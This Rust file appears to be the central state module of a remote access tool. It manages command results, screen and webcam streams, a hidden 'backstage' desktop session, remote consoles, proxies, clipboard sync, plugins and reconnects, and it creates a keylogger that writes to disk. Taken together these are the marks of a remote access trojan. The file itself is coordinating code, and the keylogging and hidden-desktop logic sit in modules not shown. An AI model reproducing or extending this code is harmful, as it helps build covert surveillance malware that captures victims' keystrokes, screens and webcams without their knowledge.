use std::{
    collections::HashMap,
    sync::{
        Arc, Mutex,
        atomic::{AtomicBool, AtomicU32, AtomicUsize, Ordering},
    },
};

use tokio::sync::mpsc;
use tokio_util::sync::CancellationToken;

use crate::{
    config::Config,
    protocol::{self, Obj, Value},
};

#[derive(Clone)]
pub struct Outbound {
    tx: mpsc::Sender<Value>,
}

impl Outbound {
    pub fn new(capacity: usize) -> (Self, mpsc::Receiver<Value>) {
        let (tx, rx) = mpsc::channel(capacity);
        (Self { tx }, rx)
    }

    pub async fn send(&self, value: Value) {
        let _ = self.tx.send(value).await;
    }

    pub fn try_send(&self, value: Value) {
        let _ = self.tx.try_send(value);
    }

    pub fn blocking_send(&self, value: Value) {
        let _ = self.tx.blocking_send(value);
    }

    pub async fn result(&self, command: &Command, ok: bool, message: Option<&str>) {
        let mut object = Obj::new()
            .put(protocol::key_type(), protocol::s("command_result"))
            .put(protocol::key_command_id(), protocol::s(&command.id))
            .put(protocol::key_command_type(), protocol::s(&command.name))
            .put(protocol::key_command_version(), protocol::n(command.version as i64))
            .put(protocol::key_ok(), protocol::b(ok));
        if let Some(message) = message {
            object = object.put(protocol::key_message(), protocol::s(message));
        }
        self.send(object.value()).await;
    }

    pub async fn result_with_code(
        &self,
        command: &Command,
        ok: bool,
        message: Option<&str>,
        error_code: Option<&str>,
    ) {
        let mut object = Obj::new()
            .put(protocol::key_type(), protocol::s("command_result"))
            .put(protocol::key_command_id(), protocol::s(&command.id))
            .put(protocol::key_command_type(), protocol::s(&command.name))
            .put(protocol::key_command_version(), protocol::n(command.version as i64))
            .put(protocol::key_ok(), protocol::b(ok));
        if let Some(message) = message {
            object = object.put(protocol::key_message(), protocol::s(message));
        }
        if let Some(code) = error_code {
            object = object.put(protocol::key_error_code(), protocol::s(code));
        }
        self.send(object.value()).await;
    }

    pub async fn progress(&self, command: &Command, message: &str) {
        self.send(
            Obj::new()
                .put(protocol::key_type(), protocol::s("command_progress"))
                .put(protocol::key_command_id(), protocol::s(&command.id))
                .put(protocol::key_command_version(), protocol::n(command.version as i64))
                .put(protocol::key_ok(), protocol::b(true))
                .put(protocol::key_message(), protocol::s(message))
                .value(),
        )
        .await;
    }
}

#[derive(Clone, Debug)]
pub struct Command {
    pub id: String,
    pub name: String,
    pub version: u16,
    pub payload: Value,
}

pub struct StreamSettings {
    pub fps: AtomicU32,
    pub quality: AtomicU32,
    pub max_height: AtomicU32,
    pub display: AtomicUsize,
    pub cursor: AtomicBool,
    pub duplication: AtomicBool,
    pub bitrate: AtomicU32,
}

impl Default for StreamSettings {
    fn default() -> Self {
        Self {
            fps: AtomicU32::new(60),
            quality: AtomicU32::new(90),
            max_height: AtomicU32::new(1080),
            display: AtomicUsize::new(0),
            cursor: AtomicBool::new(false),
            duplication: AtomicBool::new(false),
            bitrate: AtomicU32::new(0),
        }
    }
}

pub struct StreamControl {
    pub cancel: CancellationToken,
    pub settings: Arc<StreamSettings>,
}

#[derive(Default)]
pub struct InputState {
    pub mouse: AtomicBool,
    pub keyboard: AtomicBool,
    pub cursor: AtomicBool,
}

pub struct State {
    pub config: Arc<Config>,
    pub desktop_settings: Arc<StreamSettings>,
    pub virtual_settings: Arc<StreamSettings>,
    pub backstage_settings: Arc<StreamSettings>,
    pub desktop: Mutex<Option<StreamControl>>,
    pub virtual_stream: Mutex<Option<StreamControl>>,
    pub backstage: Mutex<Option<StreamControl>>,
    pub webcam: Mutex<Option<StreamControl>>,
    pub webcam_selected: AtomicUsize,
    pub webcam_fps: AtomicU32,
    pub webcam_quality: AtomicU32,
    pub desktop_input: InputState,
    pub virtual_input: InputState,
    pub backstage_input: InputState,
    pub consoles: crate::commands::console::ConsoleHub,
    pub proxies: Mutex<HashMap<String, crate::commands::proxy::ProxyHandle>>,
    pub clipboard_sync: Mutex<Option<CancellationToken>>,
    pub keylogger: crate::commands::keylogger::Keylogger,
    pub privacy: AtomicBool,
    pub plugins: Mutex<crate::commands::plugin::PluginManager>,
    pub cancellations: Mutex<HashMap<String, CancellationToken>>,
    pub session_cancel: Mutex<Option<CancellationToken>>,
    pub exit_requested: AtomicBool,
}

impl State {
    pub fn new(config: Arc<Config>) -> Self {
        let keylogger = crate::commands::keylogger::Keylogger::new(config.state_dir.clone());
        Self {
            config,
            desktop_settings: Arc::new(StreamSettings::default()),
            virtual_settings: Arc::new(StreamSettings::default()),
            backstage_settings: Arc::new(StreamSettings::default()),
            desktop: Mutex::new(None),
            virtual_stream: Mutex::new(None),
            backstage: Mutex::new(None),
            webcam: Mutex::new(None),
            webcam_selected: AtomicUsize::new(0),
            webcam_fps: AtomicU32::new(60),
            webcam_quality: AtomicU32::new(80),
            desktop_input: InputState::default(),
            virtual_input: InputState::default(),
            backstage_input: InputState::default(),
            consoles: crate::commands::console::ConsoleHub::new(),
            proxies: Mutex::new(HashMap::new()),
            clipboard_sync: Mutex::new(None),
            keylogger,
            privacy: AtomicBool::new(false),
            plugins: Mutex::new(crate::commands::plugin::PluginManager::default()),
            cancellations: Mutex::new(HashMap::new()),
            session_cancel: Mutex::new(None),
            exit_requested: AtomicBool::new(false),
        }
    }

    pub fn request_reconnect(&self, exit: bool) {
        self.exit_requested.store(exit, Ordering::Relaxed);
        if let Ok(mut guard) = self.session_cancel.lock() {
            if let Some(token) = guard.take() {
                token.cancel();
            }
        }
    }

    pub fn register_cancellable(&self, id: &str) -> CancellationToken {
        let token = CancellationToken::new();
        self.cancellations
            .lock()
            .unwrap()
            .insert(id.to_owned(), token.clone());
        token
    }

    pub fn clear_cancellable(&self, id: &str) {
        self.cancellations.lock().unwrap().remove(id);
    }

    pub fn abort(&self, id: &str) -> bool {
        match self.cancellations.lock().unwrap().remove(id) {
            Some(token) => {
                token.cancel();
                true
            }
            None => false,
        }
    }

    pub fn stop_streams(&self) {
        for slot in [&self.desktop, &self.virtual_stream, &self.backstage, &self.webcam] {
            if let Ok(mut guard) = slot.lock() {
                if let Some(control) = guard.take() {
                    control.cancel.cancel();
                }
            }
        }
        if let Ok(mut guard) = self.clipboard_sync.lock() {
            if let Some(cancel) = guard.take() {
                cancel.cancel();
            }
        }
        if let Ok(mut proxies) = self.proxies.lock() {
            for (_, handle) in proxies.drain() {
                handle.cancel.cancel();
            }
        }
        #[cfg(windows)]
        {
            crate::win::hidden::kill_all();
            crate::win::hidden::stop();
        }
    }

    pub fn is_privacy(&self) -> bool {
        self.privacy.load(Ordering::Relaxed)
    }
}

pub fn set_stream(
    slot: &Mutex<Option<StreamControl>>,
    cancel: CancellationToken,
    settings: Arc<StreamSettings>,
) {
    if let Ok(mut guard) = slot.lock() {
        if let Some(previous) = guard.take() {
            previous.cancel.cancel();
        }
        *guard = Some(StreamControl { cancel, settings });
    }
}

pub fn cancel_stream(slot: &Mutex<Option<StreamControl>>) {
    if let Ok(mut guard) = slot.lock() {
        if let Some(control) = guard.take() {
            control.cancel.cancel();
        }
    }
}
